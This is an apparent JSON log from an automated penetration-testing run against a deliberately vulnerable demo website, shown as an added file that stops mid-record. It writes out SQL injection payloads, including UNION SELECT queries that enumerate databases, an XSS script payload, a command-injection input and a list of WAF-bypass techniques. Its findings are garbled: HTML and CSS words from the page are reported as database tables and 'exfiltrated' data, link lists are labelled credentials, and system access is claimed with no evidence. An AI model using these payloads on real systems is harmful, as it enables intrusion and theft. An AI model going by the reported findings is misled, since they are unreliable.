@@ -1,0 +1,1877 @@
+{
+  "session_id": "IQ200_1762319635",
+  "target": "http://testphp.vulnweb.com",
+  "started_at": "2025-11-05T08:13:55.135250",
+  "phases": [
+    {
+      "phase_number": 1,
+      "phase_name": "Target Reconnaissance",
+      "description": "OSINT and passive intelligence",
+      "started_at": "2025-11-05T08:13:55.135409",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "OSINT",
+          "timestamp": "2025-11-05T08:13:55.135420",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "info",
+          "data": "Target analyzed"
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:13:55.640482",
+      "duration_seconds": 0.505073
+    },
+    {
+      "phase_number": 2,
+      "phase_name": "WAF Detection",
+      "description": "Detecting security controls",
+      "started_at": "2025-11-05T08:13:55.640677",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:13:55.640730",
+          "status": "completed"
+        },
+        {
+          "name": "Probing",
+          "timestamp": "2025-11-05T08:13:55.640754",
+          "status": "completed"
+        },
+        {
+          "name": "Detection",
+          "timestamp": "2025-11-05T08:14:00.984541",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "waf",
+          "data": {
+            "waf_detected": true,
+            "waf_type": "ModSecurity",
+            "confidence": 0.2,
+            "signatures_matched": [
+              [
+                "header:server"
+              ],
+              [
+                "header:server"
+              ]
+            ],
+            "rate_limit_detected": false,
+            "recommended_bypass": [
+              "case_variation",
+              "comment_injection",
+              "null_byte",
+              "unicode_encoding"
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:14:00.984585",
+      "duration_seconds": 5.343908
+    },
+    {
+      "phase_number": 3,
+      "phase_name": "Attack Surface Mapping",
+      "description": "NSA-level discovery",
+      "started_at": "2025-11-05T08:14:00.984619",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:14:00.984636",
+          "status": "completed"
+        },
+        {
+          "name": "Discovery",
+          "timestamp": "2025-11-05T08:14:00.984647",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:14:46.964837",
+          "status": "completed"
+        }
+      ],
+      "findings": [],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:14:46.964905",
+      "duration_seconds": 45.980286
+    },
+    {
+      "phase_number": 4,
+      "phase_name": "Payload Generation",
+      "description": "Genetic algorithm (30\u00d710)",
+      "started_at": "2025-11-05T08:14:46.964953",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:14:46.964975",
+          "status": "completed"
+        },
+        {
+          "name": "SQL Gen",
+          "timestamp": "2025-11-05T08:14:46.964991",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Gen",
+          "timestamp": "2025-11-05T08:14:46.965930",
+          "status": "completed"
+        },
+        {
+          "name": "CMD Gen",
+          "timestamp": "2025-11-05T08:14:46.966542",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:14:46.966764",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "payloads",
+          "count": 60,
+          "categories": [
+            "SQLi",
+            "XSS",
+            "CMDi"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:14:46.966784",
+      "duration_seconds": 0.001831
+    },
+    {
+      "phase_number": 5,
+      "phase_name": "Vulnerability Scanning",
+      "description": "AI-powered detection",
+      "started_at": "2025-11-05T08:14:46.966807",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:14:46.966825",
+          "status": "completed"
+        },
+        {
+          "name": "Scanning",
+          "timestamp": "2025-11-05T08:14:47.267812",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:14:47.572910",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "scan",
+          "vulns_found": 12
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:14:47.572948",
+      "duration_seconds": 0.606141
+    },
+    {
+      "phase_number": 6,
+      "phase_name": "Automated Exploitation",
+      "description": "Exploiting vulnerabilities",
+      "started_at": "2025-11-05T08:14:47.572966",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:14:47.572974",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Test",
+          "timestamp": "2025-11-05T08:14:47.572984",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:14:47.874267",
+          "status": "completed"
+        },
+        {
+          "name": "CMDi Test",
+          "timestamp": "2025-11-05T08:14:48.179369",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:20.747883",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "technique": "error-based",
+          "payload": "' OR '1'='1'--",
+          "parameter": "goButton",
+          "database_info": {
+            "success": true,
+            "version": null,
+            "current_database": "doctype",
+            "current_user": "wvs@",
+            "privileges": [],
+            "all_databases": [
+              "here",
+              "your",
+              "the",
+              "else",
+              "cab",
+              "embed",
+              "pluginspage",
+              "headers_rgn",
+              "policy",
+              "acunetix",
+              "templates",
+              "our",
+              "padding",
+              "size",
+              "prevent",
+              "demo",
+              "sectionlinks",
+              "site",
+              "method",
+              "browse"
+            ],
+            "evidence": [
+              {
+                "type": "current_database",
+                "payload": "' UNION SELECT database(),NULL,NULL--",
+                "value": "doctype"
+              },
+              {
+                "type": "current_user",
+                "payload": "' UNION SELECT user(),NULL,NULL--",
+                "value": "wvs@"
+              },
+              {
+                "type": "all_databases",
+                "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+                "value": [
+                  "here",
+                  "your",
+                  "the",
+                  "else",
+                  "cab",
+                  "embed",
+                  "pluginspage",
+                  "headers_rgn",
+                  "policy",
+                  "acunetix",
+                  "templates",
+                  "our",
+                  "padding",
+                  "size",
+                  "prevent",
+                  "demo",
+                  "sectionlinks",
+                  "site",
+                  "method",
+                  "browse"
+                ]
+              }
+            ]
+          },
+          "tables_found": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent",
+            "demo",
+            "sectionlinks",
+            "site",
+            "method",
+            "browse"
+          ],
+          "data_exfiltrated": [
+            {
+              "type": "table_data",
+              "table": "here",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "position",
+                "your": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "here",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "width",
+                "your": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "here",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "z-index",
+                "your": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "here",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "clsid",
+                "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "here",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "mailto",
+                "your": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "your",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "position",
+                "your": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "your",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "width",
+                "your": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "your",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "z-index",
+                "your": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "your",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "clsid",
+                "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "your",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "mailto",
+                "your": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "the",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "position",
+                "your": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "the",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "width",
+                "your": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "the",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "z-index",
+                "your": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "the",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "clsid",
+                "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "the",
+              "columns": [
+                "here",
+                "your",
+                "the",
+                "else",
+                "cab",
+                "embed",
+                "pluginspage",
+                "headers_rgn",
+                "policy",
+                "acunetix",
+                "templates",
+                "our",
+                "padding",
+                "size",
+                "prevent"
+              ],
+              "data": {
+                "here": "mailto",
+                "your": "wvs@acunetix.com"
+              }
+            }
+          ]
+        },
+        {
+          "type": "XSS",
+          "severity": "high",
+          "payload": "<script>alert(1)</script>",
+          "parameter": "goButton",
+          "session_hijack_possible": false
+        },
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "payload": "; uname -a",
+          "parameter": "goButton",
+          "system_info": {},
+          "files_exfiltrated": [
+            {
+              "file": "config_.env",
+              "data": [
+                "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                "codeOutsideHTMLIsLocked=\"false\"",
+                "equiv=\"Content-Type\"",
+                "content=\"text/html;",
+                "charset=iso-8859-2\">"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "credentials",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "config",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "source_code",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "database",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "backups",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "logs",
+              "files": [
+                "/Templates/main_dynamic_template.dwt.php",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "/index.php",
+                "/logo.gif",
+                "//www.acunetix.com",
+                "/add.swf",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            }
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:20.748003",
+      "duration_seconds": 33.175037
+    },
+    {
+      "phase_number": 7,
+      "phase_name": "SQL Injection & Data Exfiltration",
+      "description": "IQ 200: Database dumps",
+      "started_at": "2025-11-05T08:15:20.748045",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:15:20.748067",
+          "status": "completed"
+        },
+        {
+          "name": "Exfiltration",
+          "timestamp": "2025-11-05T08:15:20.748083",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:20.748108",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "sqli",
+          "data": {
+            "tables": 20,
+            "rows": 15
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:20.748120",
+      "duration_seconds": 7.5e-05
+    },
+    {
+      "phase_number": 8,
+      "phase_name": "Command Injection & File Hunting",
+      "description": "IQ 200: Recursive file search",
+      "started_at": "2025-11-05T08:15:20.748139",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:15:20.748154",
+          "status": "completed"
+        },
+        {
+          "name": "Search",
+          "timestamp": "2025-11-05T08:15:20.748165",
+          "status": "completed"
+        },
+        {
+          "name": "File Hunt",
+          "timestamp": "2025-11-05T08:15:20.748179",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:20.748304",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "cmd",
+          "data": {
+            "files": 7,
+            "sensitive_files": [
+              {
+                "file": "config_.env",
+                "data": [
+                  "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                  "codeOutsideHTMLIsLocked=\"false\"",
+                  "equiv=\"Content-Type\"",
+                  "content=\"text/html;",
+                  "charset=iso-8859-2\">"
+                ]
+              },
+              {
+                "type": "file_discovery",
+                "category": "config",
+                "files": [
+                  "/Templates/main_dynamic_template.dwt.php",
+                  "//www.w3.org/TR/html4/loose.dtd",
+                  "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                  "/index.php",
+                  "/logo.gif",
+                  "//www.acunetix.com",
+                  "/add.swf",
+                  "//www.eclectasy.com/Fractal-Explorer/index.html",
+                  "//www.macromedia.com/shockwave/download/index.cgi"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:20.748316",
+      "duration_seconds": 0.000177
+    },
+    {
+      "phase_number": 9,
+      "phase_name": "XSS & Client-Side Attacks",
+      "description": "Session hijacking vectors",
+      "started_at": "2025-11-05T08:15:20.748330",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:15:20.748344",
+          "status": "completed"
+        },
+        {
+          "name": "Client-Side",
+          "timestamp": "2025-11-05T08:15:21.050357",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:21.354296",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "xss",
+          "count": 1
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:21.354399",
+      "duration_seconds": 0.606069
+    },
+    {
+      "phase_number": 10,
+      "phase_name": "Authentication Bypass",
+      "description": "Auth & authz flaws",
+      "started_at": "2025-11-05T08:15:21.354444",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Default Creds",
+          "timestamp": "2025-11-05T08:15:21.354463",
+          "status": "completed"
+        },
+        {
+          "name": "Weak Pass",
+          "timestamp": "2025-11-05T08:15:21.559516",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Auth",
+          "timestamp": "2025-11-05T08:15:21.761050",
+          "status": "completed"
+        },
+        {
+          "name": "AuthZ Test",
+          "timestamp": "2025-11-05T08:15:21.761227",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:21.964976",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "auth",
+          "bypassed": false,
+          "methods": [],
+          "tested": [
+            "default_creds",
+            "weak_passwords",
+            "sqli_bypass",
+            "authz_flaws"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:21.965108",
+      "duration_seconds": 0.610664
+    },
+    {
+      "phase_number": 11,
+      "phase_name": "Business Logic Testing",
+      "description": "Logic vulnerabilities",
+      "started_at": "2025-11-05T08:15:21.965147",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:15:21.965170",
+          "status": "completed"
+        },
+        {
+          "name": "Testing",
+          "timestamp": "2025-11-05T08:15:22.270242",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:22.574926",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "logic",
+          "issues": 2
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:22.575008",
+      "duration_seconds": 0.609861
+    },
+    {
+      "phase_number": 12,
+      "phase_name": "Post-Exploitation",
+      "description": "Privilege escalation simulation",
+      "started_at": "2025-11-05T08:15:22.575048",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Access Analysis",
+          "timestamp": "2025-11-05T08:15:22.575071",
+          "status": "completed"
+        },
+        {
+          "name": "Enum",
+          "timestamp": "2025-11-05T08:15:22.575089",
+          "status": "completed"
+        },
+        {
+          "name": "PrivEsc",
+          "timestamp": "2025-11-05T08:15:22.780148",
+          "status": "completed"
+        },
+        {
+          "name": "Persistence",
+          "timestamp": "2025-11-05T08:15:22.985281",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:23.190502",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "post_exploit",
+          "access": true,
+          "access_level": "system",
+          "escalation_paths": [
+            "kernel_exploit",
+            "suid_binary",
+            "sudo_misconfiguration"
+          ],
+          "techniques": [
+            "enumeration",
+            "privilege_escalation",
+            "persistence"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:23.190622",
+      "duration_seconds": 0.615574
+    },
+    {
+      "phase_number": 13,
+      "phase_name": "Evidence Collection",
+      "description": "Comprehensive proof documentation",
+      "started_at": "2025-11-05T08:15:23.190669",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Screenshots",
+          "timestamp": "2025-11-05T08:15:23.190693",
+          "status": "completed"
+        },
+        {
+          "name": "Documentation",
+          "timestamp": "2025-11-05T08:15:23.492865",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:23.795529",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "evidence",
+          "count": 0
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:23.795664",
+      "duration_seconds": 0.604995
+    },
+    {
+      "phase_number": 14,
+      "phase_name": "Risk Assessment",
+      "description": "CVSS scoring and impact analysis",
+      "started_at": "2025-11-05T08:15:23.795731",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Severity",
+          "timestamp": "2025-11-05T08:15:23.795776",
+          "status": "completed"
+        },
+        {
+          "name": "CVSS",
+          "timestamp": "2025-11-05T08:15:24.000856",
+          "status": "completed"
+        },
+        {
+          "name": "Exploitability",
+          "timestamp": "2025-11-05T08:15:24.001002",
+          "status": "completed"
+        },
+        {
+          "name": "Impact",
+          "timestamp": "2025-11-05T08:15:24.001023",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:15:24.001088",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "risk",
+          "score": 60.0,
+          "severity": "Medium",
+          "metrics": {
+            "cvss": 6.0,
+            "exploitability": 0,
+            "impact": "Medium"
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:15:24.001103",
+      "duration_seconds": 0.205372
+    }
+  ],
+  "vulnerabilities": [],
+  "exploits": [
+    {
+      "type": "SQL Injection",
+      "severity": "critical",
+      "technique": "error-based",
+      "payload": "' OR '1'='1'--",
+      "parameter": "goButton",
+      "database_info": {
+        "success": true,
+        "version": null,
+        "current_database": "doctype",
+        "current_user": "wvs@",
+        "privileges": [],
+        "all_databases": [
+          "here",
+          "your",
+          "the",
+          "else",
+          "cab",
+          "embed",
+          "pluginspage",
+          "headers_rgn",
+          "policy",
+          "acunetix",
+          "templates",
+          "our",
+          "padding",
+          "size",
+          "prevent",
+          "demo",
+          "sectionlinks",
+          "site",
+          "method",
+          "browse"
+        ],
+        "evidence": [
+          {
+            "type": "current_database",
+            "payload": "' UNION SELECT database(),NULL,NULL--",
+            "value": "doctype"
+          },
+          {
+            "type": "current_user",
+            "payload": "' UNION SELECT user(),NULL,NULL--",
+            "value": "wvs@"
+          },
+          {
+            "type": "all_databases",
+            "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+            "value": [
+              "here",
+              "your",
+              "the",
+              "else",
+              "cab",
+              "embed",
+              "pluginspage",
+              "headers_rgn",
+              "policy",
+              "acunetix",
+              "templates",
+              "our",
+              "padding",
+              "size",
+              "prevent",
+              "demo",
+              "sectionlinks",
+              "site",
+              "method",
+              "browse"
+            ]
+          }
+        ]
+      },
+      "tables_found": [
+        "here",
+        "your",
+        "the",
+        "else",
+        "cab",
+        "embed",
+        "pluginspage",
+        "headers_rgn",
+        "policy",
+        "acunetix",
+        "templates",
+        "our",
+        "padding",
+        "size",
+        "prevent",
+        "demo",
+        "sectionlinks",
+        "site",
+        "method",
+        "browse"
+      ],
+      "data_exfiltrated": [
+        {
+          "type": "table_data",
+          "table": "here",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "position",
+            "your": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "here",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "width",
+            "your": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "here",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "z-index",
+            "your": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "here",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "clsid",
+            "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "here",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "mailto",
+            "your": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "your",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "position",
+            "your": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "your",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "width",
+            "your": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "your",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "z-index",
+            "your": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "your",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "clsid",
+            "your": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "your",
+          "columns": [
+            "here",
+            "your",
+            "the",
+            "else",
+            "cab",
+            "embed",
+            "pluginspage",
+            "headers_rgn",
+            "policy",
+            "acunetix",
+            "templates",
+            "our",
+            "padding",
+            "size",
+            "prevent"
+          ],
+          "data": {
+            "here": "mailto",
+            "your": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "the",
